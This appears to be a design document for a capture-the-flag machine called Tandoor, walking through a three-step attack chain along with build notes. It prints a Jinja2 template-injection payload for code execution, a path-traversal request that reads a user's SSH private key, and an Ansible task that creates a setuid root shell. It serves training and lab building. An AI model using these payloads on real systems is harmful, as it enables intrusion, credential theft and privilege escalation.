# CTF Machine: Tandoor

## Overview

**Name:** Tandoor
**Difficulty:** Medium
**OS:** Ubuntu 24.04 LTS
**Domain:** `tandoor.ms`
**Theme:** Internal API LFI, DevOps Automation (Ansible) Abuse

**Story:** A startup's sysadmin team uses Ansible for server automation and built an internal-only API for developers to read system logs. The server looks secure from the outside — the only exposed services are SSH and the web application. But the internal trust between services and careless DevOps permissions turn a template injection into full system compromise.

---

## Architecture

| Component | Detail |
|-----------|--------|
| Web | Nginx (HTTPS 443) → Tandoor recipe app with Jinja2 templates (port 8080) |
| Internal API | Flask "Dev Log Viewer" (localhost:5000 only) |
| Automation | Ansible playbook at `/opt/devops/ansible/site.yml` via systemd timer |
| Database | PostgreSQL (localhost, password auth) |
| Open Ports | 22 (SSH), 443 (HTTPS) |
| App runs as | `tandoor` user |
| Internal API runs as | `developer` user |

---

## Attack Chain

### 1 → Server-Side Template Injection (CWE-1336) — Anonymous → Shell as tandoor

The solver interacts with the Tandoor application and finds a PDF export feature for recipes. The export function uses Jinja2 templates and allows user-controlled input in the recipe name/description fields.

The solver injects a Jinja2 SSTI payload into a recipe field and triggers the PDF export:

```python
# Test for SSTI
{{ 7*7 }}  →  renders as "49" in the PDF

# RCE payload
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

A reverse shell is established as the `tandoor` user.

**Why it works:** The recipe PDF export uses Jinja2's `Template()` with user-controlled content instead of using a safe sandboxed renderer. The developer prioritized feature speed over template security.

### 2 → Internal LFI via Dev Log Viewer — tandoor → developer

After gaining a shell as `tandoor`, the solver enumerates internal services:

```bash
ss -tlnp
# Discovers localhost:5000 — "Dev Log Viewer" Flask API

curl http://127.0.0.1:5000/
# Returns API docs mentioning /logs?file=app.log endpoint

curl http://127.0.0.1:5000/logs?file=app.log
# Returns log contents — file parameter is user-controlled
```

The solver tests for LFI and reads the developer's SSH key:

```bash
curl "http://127.0.0.1:5000/logs?file=../../../../home/developer/.ssh/id_rsa"
```

The API runs as `developer`, so it can read `developer`'s files. The solver uses the key to SSH as `developer`:

```bash
# Save the key and connect
chmod 600 /tmp/id_rsa
ssh -i /tmp/id_rsa developer@localhost
```

**Why it works:** The Dev Log Viewer was built as a quick internal tool for developers to read log files without SSH access. It was never meant to be internet-facing (and it isn't), but it accepts arbitrary file paths. Since it runs as `developer`, it can read that user's files. The `tandoor` user can reach it because it binds to `localhost`.

### 3 → Ansible Playbook Injection — developer → root

The solver enumerates systemd timers and discovers an Ansible playbook that runs as root every 5 minutes:

```bash
systemctl list-timers --all
# Shows ansible-maintenance.timer running every 5 minutes

cat /etc/systemd/system/ansible-maintenance.service
# Runs: ansible-playbook /opt/devops/ansible/site.yml

ls -la /opt/devops/ansible/
# developer group has write access to the directory
```

The solver modifies `site.yml` to include a reverse shell:

```yaml
- name: Malicious task
  hosts: localhost
  tasks:
    - name: Exec shell
      shell: cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
```

After the next timer execution, the solver runs `/tmp/rootbash -p` for root.

**Why it works:** The DevOps team gave the `developer` group write access to the Ansible directory so developers could update playbooks during development. They forgot to revoke it in production. The systemd timer runs the playbook as root every 5 minutes for automated server maintenance.

---

## Rabbit Holes

### Rabbit Hole 1: KeePass Database

The `developer` user's home directory contains a `.kdbx` (KeePass password database) file. A solver might exfiltrate it and spend significant time cracking it with `hashcat` or `john`. The database contains old, irrelevant passwords from a previous project — none work on this server.

**What it teaches:** Not every interesting file is relevant. Validate discovered credentials against actual services before investing time in cracking.

### Rabbit Hole 2: PostgreSQL Access

The `tandoor` user can read the application's config file which contains PostgreSQL credentials. The database contains user accounts with bcrypt-hashed passwords. A solver might try to crack these hashes, but they are strong random passwords that won't crack in reasonable time, and the database user passwords don't match any system account passwords.

**What it teaches:** Database credential dumps are only useful if there's credential reuse. Always check for reuse before investing in hash cracking.

---

## Flags

| Flag | Location | Access |
|------|----------|--------|
| user.txt | /home/developer/ | developer |
| root.txt | /root/ | root |

---

## Full Chain Diagram

```
Anonymous
    │  nmap → web enumeration → find PDF export
    │  SSTI in Jinja2 template → reverse shell
    ▼
tandoor
    │  ss -tlnp → discover localhost:5000
    │  LFI on Dev Log Viewer → read developer's SSH key
    ▼
developer  →  user.txt
    │  systemctl list-timers → Ansible maintenance timer
    │  /opt/devops/ansible/ writable by developer group
    │  Inject malicious task into site.yml → root executes it
    ▼
root  →  root.txt
```

---

## Implementation Notes

### Packages to Install
- nginx, python3, python3-pip, python3-flask, python3-jinja2, postgresql, ansible, openssh-server

### Configuration Changes
- Nginx reverse proxy 443 → localhost:8080 with self-signed SSL
- Tandoor app runs as `tandoor` user via systemd
- Dev Log Viewer Flask app runs as `developer` user, bound to localhost:5000
- Ansible playbook at `/opt/devops/ansible/site.yml` with `developer` group write access
- Systemd timer running ansible-playbook every 5 minutes as root

### Files to Create
- Tandoor recipe application with PDF export (Jinja2 SSTI vulnerability)
- Dev Log Viewer Flask API at localhost:5000 (LFI vulnerability)
- Ansible playbook for server maintenance
- Systemd service and timer for ansible automation
- KeePass database (rabbit hole) in developer's home directory

### Services to Enable
- nginx, postgresql, tandoor (systemd), dev-log-viewer (systemd), ansible-maintenance.timer

### User Accounts
| Username | Password | Shell | Groups | Purpose |
|----------|----------|-------|--------|---------|
| tandoor | [random] | /bin/bash | tandoor | Runs the recipe web application |
| developer | [random] | /bin/bash | developer | Developer with SSH key, DevOps access |

### Verification Checklist
- [ ] `nmap -sV` shows only ports 22 and 443
- [ ] SSTI payload in recipe PDF export achieves shell as `tandoor`
- [ ] `ss -tlnp` from `tandoor` shell shows localhost:5000
- [ ] LFI on Dev Log Viewer reads `/home/developer/.ssh/id_rsa`
- [ ] SSH key works for `developer` user
- [ ] Ansible directory is writable by `developer` group
- [ ] Systemd timer runs ansible-playbook as root every 5 minutes
- [ ] Modified playbook achieves root
- [ ] KeePass database contains only irrelevant old passwords
- [ ] PostgreSQL password hashes are uncrackable in reasonable time
- [ ] No unintended privesc paths (test with linpeas)
